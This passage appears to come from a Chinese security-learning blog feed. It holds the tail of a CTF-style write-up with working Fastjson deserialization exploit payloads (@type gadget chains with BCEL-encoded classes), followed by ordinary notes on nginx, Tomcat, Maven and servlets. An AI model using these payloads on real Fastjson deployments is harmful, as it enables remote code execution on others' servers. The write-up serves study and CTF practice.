class="hljs-variable">$bd</span><span class="hljs-variable">$89</span><span class="hljs-variable">$YI</span><span class="hljs-variable">$3a2K</span><span class="hljs-variable">$e1xgf</span><span class="hljs-variable">$v</span><span class="hljs-variable">$a2E3</span><span class="hljs-variable">$v</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$j</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$96</span><span class="hljs-variable">$aec</span><span class="hljs-variable">$bfF</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$P</span><span class="hljs-variable">$94</span><span class="hljs-variable">$d0</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$NZ</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$60</span><span class="hljs-variable">$J</span><span class="hljs-variable">$87J</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$p</span><span class="hljs-variable">$rk</span><span class="hljs-variable">$R</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$96o</span><span class="hljs-variable">$zRu</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$L</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$a9V</span><span class="hljs-variable">$adU</span><span class="hljs-variable">$93K</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$I8</span><span class="hljs-variable">$o</span><span class="hljs-variable">$86</span><span class="hljs-variable">$beo</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$n</span><span class="hljs-variable">$dcM</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$i</span><span class="hljs-variable">$3ai</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$870b</span><span class="hljs-variable">$f4</span><span class="hljs-variable">$8e</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$3a</span><span class="hljs-variable">$88</span><span class="hljs-variable">$92</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$87</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$YC7</span><span class="hljs-variable">$3d0hX</span><span class="hljs-variable">$qt</span><span class="hljs-variable">$N</span><span class="hljs-variable">$87</span><span class="hljs-variable">$a9A</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$e0</span><span class="hljs-variable">$Kz</span><span class="hljs-variable">$a9</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$e1</span><span class="hljs-variable">$x</span><span class="hljs-variable">$a2</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$G</span><span class="hljs-variable">$R</span><span class="hljs-variable">$f8</span><span class="hljs-variable">$Ti</span><span class="hljs-variable">$ffJ</span><span class="hljs-variable">$96</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c01</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$89</span><span class="hljs-variable">$E</span><span class="hljs-variable">$fe</span><span class="hljs-variable">$c2q</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$B</span><span class="hljs-variable">$x</span><span class="hljs-variable">$VB</span><span class="hljs-variable">$J</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$a0</span><span class="hljs-variable">$df</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$7e</span><span class="hljs-variable">$p</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$90H</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$84_0</span><span class="hljs-variable">$84</span><span class="hljs-variable">$e12</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$m</span><span class="hljs-variable">$89</span><span class="hljs-variable">$R</span><span class="hljs-variable">$8ac</span><span class="hljs-variable">$M_</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$k</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$85</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$d3U</span><span class="hljs-variable">$dcK</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$I</span><span class="hljs-variable">$f9Z</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$J</span><span class="hljs-variable">$8a</span><span class="hljs-variable">$oJ</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$f44</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$A</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$dc</span><span class="hljs-variable">$m</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$H</span><span class="hljs-variable">$J</span><span class="hljs-variable">$93</span><span class="hljs-variable">$c9c</span><span class="hljs-variable">$i</span><span class="hljs-variable">$P</span><span class="hljs-variable">$e1aJ</span><span class="hljs-variable">$e6I</span><span class="hljs-variable">$b2</span><span class="hljs-variable">$de</span><span class="hljs-variable">$D</span><span class="hljs-variable">$e9_</span><span class="hljs-variable">$K</span><span class="hljs-variable">$8a1</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$YF</span><span class="hljs-variable">$ZN1</span><span class="hljs-variable">$3cR</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$91</span><span class="hljs-variable">$fcQ</span><span class="hljs-variable">$fa</span><span class="hljs-variable">$aad</span><span class="hljs-variable">$f34</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$Y</span><span class="hljs-variable">$sp</span><span class="hljs-variable">$86</span><span class="hljs-variable">$e28KX</span><span class="hljs-variable">$L</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$H</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$99</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$J</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.friend.connection&quot;</span>&#125;&#125;],<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;asd&quot;</span>&#125;</code></pre></div><p>相比之前的数组，在原来的基础上添加了<code>.friend</code></p><p><code>&quot;driverClassLoader&quot;:&#123;&quot;$ref&quot;:&quot;$.friend[1]&quot;&#125;,</code> </p><p><code>&quot;driver&quot;:&#123;&quot;$ref&quot;:&quot;$.friend.connection&quot;&#125;</code></p><p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924164904743.png" alt="image-20230924164904743"></p><p>jar命令查看jar包里的文件</p><p>然后把脚本的注释部分（读取f1111ag.txt）去掉注释，再来一遍即可</p><h4 id="使用JSONObject调用getter"><a href="#使用JSONObject调用getter" class="headerlink" title="使用JSONObject调用getter"></a>使用JSONObject调用getter</h4><p>关键是设置<code>&quot;$ref&quot;: &quot;..&quot;</code>    </p><div class="code-wrapper"><pre><code class="hljs powershell">&#123;<span class="hljs-string">&quot;friend&quot;</span>:&#123; <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;&#125;,<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;x&quot;</span>: &#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>: &#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>: <span class="hljs-string">&quot;..&quot;</span> &#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$l</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span><span class="hljs-variable">$Am</span><span class="hljs-variable">$91</span><span class="hljs-variable">$ddN</span><span class="hljs-variable">$h1</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$85</span><span class="hljs-variable">$8f</span><span class="hljs-variable">$93</span><span class="hljs-variable">$F</span><span class="hljs-variable">$c36</span><span class="hljs-variable">$U</span><span class="hljs-variable">$I</span><span class="hljs-variable">$3f</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$_</span><span class="hljs-variable">$BZ</span><span class="hljs-variable">$I</span><span class="hljs-variable">$m</span><span class="hljs-variable">$c8M</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$82P</span><span class="hljs-variable">$R</span><span class="hljs-variable">$C</span><span class="hljs-variable">$vR</span><span class="hljs-variable">$g</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$s</span><span class="hljs-variable">$82k</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$98</span><span class="hljs-variable">$c4</span><span class="hljs-variable">$c8</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$ae7</span><span class="hljs-variable">$e2</span><span class="hljs-variable">$b5</span><span class="hljs-variable">$b8</span><span class="hljs-variable">$81</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$X</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$A</span><span class="hljs-variable">$PUu</span><span class="hljs-variable">$i</span><span class="hljs-variable">$w</span><span class="hljs-variable">$b2R</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$96</span><span class="hljs-variable">$f6h</span><span class="hljs-variable">$ce</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$fd</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$B</span><span class="hljs-variable">$c0</span><span class="hljs-variable">$Xl</span><span class="hljs-variable">$c6</span><span class="hljs-variable">$98</span><span class="hljs-variable">$c4r</span><span class="hljs-variable">$8cWx</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$857A</span><span class="hljs-variable">$dfr</span><span class="hljs-variable">$bc</span><span class="hljs-variable">$e3x</span><span class="hljs-variable">$cf0</span><span class="hljs-variable">$b9</span><span class="hljs-variable">$af</span><span class="hljs-variable">$ad</span><span class="hljs-variable">$f6</span><span class="hljs-variable">$H</span><span class="hljs-variable">$M</span><span class="hljs-variable">$c5</span><span class="hljs-variable">$ea</span><span class="hljs-variable">$d6</span><span class="hljs-variable">$ZCt</span><span class="hljs-variable">$e4</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$U</span><span class="hljs-variable">$c3lS</span><span class="hljs-variable">$5b</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$ca</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$bb</span><span class="hljs-variable">$w</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$88</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$n</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$dctR</span><span class="hljs-variable">$983</span><span class="hljs-variable">$91</span><span class="hljs-variable">$e8P</span><span class="hljs-variable">$ff5</span><span class="hljs-variable">$p</span><span class="hljs-variable">$df</span><span class="hljs-variable">$d7</span><span class="hljs-variable">$v</span><span class="hljs-variable">$dd</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$3c</span><span class="hljs-variable">$kjSg</span><span class="hljs-variable">$88</span><span class="hljs-variable">$8fo</span><span class="hljs-variable">$a4</span><span class="hljs-variable">$gx</span><span class="hljs-variable">$edl</span><span class="hljs-variable">$ca</span><span class="hljs-variable">$f1</span><span class="hljs-variable">$81</span><span class="hljs-variable">$e3</span><span class="hljs-variable">$p</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$KG</span><span class="hljs-variable">$85c</span><span class="hljs-variable">$95zm</span><span class="hljs-variable">$97</span><span class="hljs-variable">$rR</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$O</span><span class="hljs-variable">$81</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$x1</span><span class="hljs-variable">$U</span><span class="hljs-variable">$rpLq</span><span class="hljs-variable">$ac</span><span class="hljs-variable">$95</span><span class="hljs-variable">$b0</span><span class="hljs-variable">$8eO</span><span class="hljs-variable">$M</span><span class="hljs-variable">$cbn</span><span class="hljs-variable">$a0leWTh</span><span class="hljs-variable">$98</span><span class="hljs-variable">$cc</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$f0</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$T</span><span class="hljs-variable">$83A</span><span class="hljs-variable">$J</span><span class="hljs-variable">$9f</span><span class="hljs-variable">$b1A</span><span class="hljs-variable">$f3B</span><span class="hljs-variable">$8ca</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$EkF</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$5e</span><span class="hljs-variable">$ed</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$7b</span><span class="hljs-variable">$a5</span><span class="hljs-variable">$a4gX</span><span class="hljs-variable">$YY</span><span class="hljs-variable">$da</span><span class="hljs-variable">$d5</span><span class="hljs-variable">$g</span><span class="hljs-variable">$a7</span><span class="hljs-variable">$cf</span><span class="hljs-variable">$df</span><span class="hljs-variable">$c0P</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$83GF</span><span class="hljs-variable">$a4i</span><span class="hljs-variable">$cb</span><span class="hljs-variable">$f9</span><span class="hljs-variable">$T</span><span class="hljs-variable">$97</span><span class="hljs-variable">$d9</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$i</span><span class="hljs-variable">$b22FZ</span><span class="hljs-variable">$ae</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$c9</span><span class="hljs-variable">$fe7</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$fb</span><span class="hljs-variable">$</span><span class="hljs-variable">$O</span><span class="hljs-variable">$ec</span><span class="hljs-variable">$8c</span><span class="hljs-variable">$89D</span><span class="hljs-variable">$5d</span><span class="hljs-variable">$g</span><span class="hljs-variable">$gWk</span><span class="hljs-variable">$d8</span><span class="hljs-variable">$nm</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b4</span><span class="hljs-variable">$3b</span><span class="hljs-variable">$o</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$v</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$ff</span><span class="hljs-variable">$91</span><span class="hljs-variable">$NcTO</span><span class="hljs-variable">$98C</span><span class="hljs-variable">$vU</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$90</span><span class="hljs-variable">$f91</span><span class="hljs-variable">$f2</span><span class="hljs-variable">$p</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$5e_</span><span class="hljs-variable">$d3Bb</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$e5</span><span class="hljs-variable">$b9X</span><span class="hljs-variable">$aan5</span><span class="hljs-variable">$ffah</span><span class="hljs-variable">$bd</span><span class="hljs-variable">$91</span><span class="hljs-variable">$baQ</span><span class="hljs-variable">$92a</span><span class="hljs-variable">$b3</span><span class="hljs-variable">$9a</span><span class="hljs-variable">$eb</span><span class="hljs-variable">$b6</span><span class="hljs-variable">$7d</span><span class="hljs-variable">$a2m</span><span class="hljs-variable">$af</span><span class="hljs-variable">$9e</span><span class="hljs-variable">$P</span><span class="hljs-variable">$7cO</span><span class="hljs-variable">$5c</span><span class="hljs-variable">$98X</span><span class="hljs-variable">$c7</span><span class="hljs-variable">$w</span><span class="hljs-variable">$s</span><span class="hljs-variable">$e8</span><span class="hljs-variable">$bf</span><span class="hljs-variable">$87</span><span class="hljs-variable">$87</span><span class="hljs-variable">$d1</span><span class="hljs-variable">$a1</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$80i</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$be</span><span class="hljs-variable">$922</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$97</span><span class="hljs-variable">$db</span><span class="hljs-variable">$f7</span><span class="hljs-variable">$60</span><span class="hljs-variable">$3fQ</span><span class="hljs-variable">$u</span><span class="hljs-variable">$X</span><span class="hljs-variable">$ef</span><span class="hljs-variable">$Q</span><span class="hljs-variable">$9d</span><span class="hljs-variable">$df</span><span class="hljs-variable">$92S</span><span class="hljs-variable">$40</span><span class="hljs-variable">$i</span><span class="hljs-variable">$7c</span><span class="hljs-variable">$U</span><span class="hljs-variable">$e9</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$I</span><span class="hljs-variable">$f3</span><span class="hljs-variable">$98A</span><span class="hljs-variable">$Z</span><span class="hljs-variable">$_</span><span class="hljs-variable">$a8</span><span class="hljs-variable">$w</span><span class="hljs-variable">$3d</span><span class="hljs-variable">$rHgF</span><span class="hljs-variable">$g</span><span class="hljs-variable">$9c</span><span class="hljs-variable">$Jb</span><span class="hljs-variable">$e6</span><span class="hljs-variable">$88</span><span class="hljs-variable">$vc</span><span class="hljs-variable">$81</span><span class="hljs-variable">$ba</span><span class="hljs-variable">$8b</span><span class="hljs-variable">$a3</span><span class="hljs-variable">$fc</span><span class="hljs-variable">$d2</span><span class="hljs-variable">$l</span><span class="hljs-variable">$aa</span><span class="hljs-variable">$ee</span><span class="hljs-variable">$90</span><span class="hljs-variable">$ebu</span><span class="hljs-variable">$C</span><span class="hljs-variable">$A</span><span class="hljs-variable">$A</span>&quot;</span>&#125;&#125;:<span class="hljs-string">&quot;x&quot;</span>&#125;&#125;,&#125;&#125;,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>&#125;</code></pre></div><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwNzk0NTkxNw==&mid=2247486057&idx=1&sn=6799b8b77f058247705beaa6995dcb82&chksm=9b7721bbac00a8adc3ca7b23590bcb7493fc93091eaf76efe4662b7d6f86068e38d20338c3c1&mpshare=1&scene=2&srcid=1109kLt9Pm0fZdiqQ8zbB0IX&sharer_sharetime=1667995572392&sharer_shareid=917ce1404b071ce27556675ad135266f#rd">Java安全攻防之老版本Fastjson的一些不出网利用 (qq.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>开发</title>
    <link href="/2023/09/16/%E5%BC%80%E5%8F%91/"/>
    <url>/2023/09/16/%E5%BC%80%E5%8F%91/</url>
    
    <content type="html"><![CDATA[<h1 id="老规矩上链接https-boogipop-com-图都是这里的，语言也很精简"><a href="#老规矩上链接https-boogipop-com-图都是这里的，语言也很精简" class="headerlink" title="老规矩上链接https://boogipop.com/图都是这里的，语言也很精简"></a>老规矩上链接<a href="https://boogipop.com/">https://boogipop.com/</a>图都是这里的，语言也很精简</h1><h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><h2 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h2><p>通过中间人牵线搭桥</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916171437179.png" alt="image-20230916171437179"></p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>给服务器配置代理服务器，客户端不知道服务端的真实ip</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916171626433.png" alt="image-20230916171626433"></p><p>客户端对代理无感知，客户端不需要任何配置就可以访问，只需要将请求发送到反向代理服务器去选择目标服务器的数据，然后返还给客户端</p><p>Boogipop的例子，反向代理服务器就是服务员，服务端就是厨师，你要什么服务员就给你拿什么</p><p>挺生动的</p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><p>基本的请求与响应</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172125171.png" alt="image-20230916172125171"></p><p>并发数越来越高，用这样的系统可能会导致<strong>服务器瘫痪</strong></p><p>所以可以使用代理服务器分配到不同的服务端，实现负载均衡</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172136692.png" alt="image-20230916172136692"></p><h2 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h2><p>仍然是代理服务器，根据发送的请求，分配到对应的服务器</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916172431286.png" alt="image-20230916172431286"></p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><h2 id="配置tomcat"><a href="#配置tomcat" class="headerlink" title="配置tomcat"></a>配置tomcat</h2><p>tomcat +http</p><p>maven配置不说了（之前搞了很久才会，早知道早看大佬文章了）</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201811624.png" alt="image-20230916201811624"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201829256.png" alt="image-20230916201829256"></p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916201910077.png" alt="image-20230916201910077"></p><p>设置你访问的路径，假如你设置为<code>/kino</code>那访问的时候就加一个<code>URL/kino</code>这个过程叫做虚拟映射，也就是路由吧</p><h2 id="pom文件"><a href="#pom文件" class="headerlink" title="pom文件"></a>pom文件</h2><p>pom.xml是maven的核心配置文件，在这里添加依赖</p><p>maven由于约定大于配置，之后可能遇到我们写的配置文件，无法被导出或者生效的问题，解决方案是在pom.xml下的bulid节点添加以下内容：</p><div class="code-wrapper"><pre><code class="hljs xml"> <span class="hljs-comment">&lt;!--在build中配置resources，来防止我们资源导出失败的问题--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span></code></pre></div><p>servlet在pom.xml中设置路由</p><h2 id="Hello-servlet"><a href="#Hello-servlet" class="headerlink" title="Hello servlet"></a>Hello servlet</h2><blockquote><p>servlet就是sun公司开发动态页面所用的东西<br>sun公司在这些API中实现了一种接口叫做：Servlet，如果你想要开发一个Servlet程序，只需要完成2个小步骤</p><ul><li>编写一个类，实现Servlet接口</li><li>把开发好的java类部署到web服务器中</li></ul><p><strong>把实现了Servlet接口的java程序，叫做Servlet</strong></p></blockquote><p>先创建一个普通的maven，然后把src目录删掉</p><p>在pom.xml中加入</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet.jsp/javax.servlet.jsp-api --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet.jsp-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><p>接着创建一个新<code>Module</code>，类型为webapp</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916215920852.png" alt="image-20230916215920852"></p><p>修改web.xml的内容为</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><span class="hljs-string"><span class="hljs-tag">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>&lt;/web-app &gt;</code></pre></div><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916220315151.png" alt="image-20230916220315151"></p><p>红色框这些都是需要自己创建的，<code>java</code>记得把他变蓝</p><p>然后可以创建程序，给了个默认接口HttpServlet</p><p><img src="/2023/09/16/%E5%BC%80%E5%8F%91/image-20230916220630784.png" alt="image-20230916220630784"></p><p>我们选择重写GET和POST方法</p><div class="code-wrapper"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span 